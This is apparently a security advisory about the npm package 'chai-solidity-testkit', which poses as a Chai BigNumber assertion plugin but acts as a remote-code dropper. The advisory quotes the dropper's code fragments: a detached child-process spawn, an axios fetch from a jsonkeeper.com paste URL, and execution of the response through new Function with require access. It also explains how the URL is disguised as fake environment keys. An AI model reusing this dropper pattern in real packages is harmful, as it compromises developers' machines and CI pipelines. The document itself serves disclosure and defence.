summary: chai-solidity-testkit fetches and executes remote JavaScript from jsonkeeper.com on chai.use()
details: Package advertises itself as a Chai plugin for Web3.js BigNumber assertions, but the exported chaiPlugin contains no assertion logic. When a consumer calls chai.use(chaiPlugin), src/index.js spawns a detached, stdio-ignored child process running src/utils/swap.js (child_process.spawn('node', [script,...], { detached: true, stdio: ['ignore'] }).unref()). swap.js performs axios.get('https://www.jsonkeeper.com/b/HXDNM') and executes the response body with new Function.constructor('require', s)(require), giving the fetched code full Node require capability inside the installer/CI process tree. The C2 URL is camouflaged as a fake process.env object with keys named DEV_API_KEY/DEV_SECRET_KEY/DEV_SECRET_VALUE, and index.js carries an unused pino-style defaultOptions object to make the file skim as a logging plugin. The package name impersonates the Chai/Solidity testing ecosystem; the only functional behavior on use is the remote-code dropper served from an anonymous, mutable paste host.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
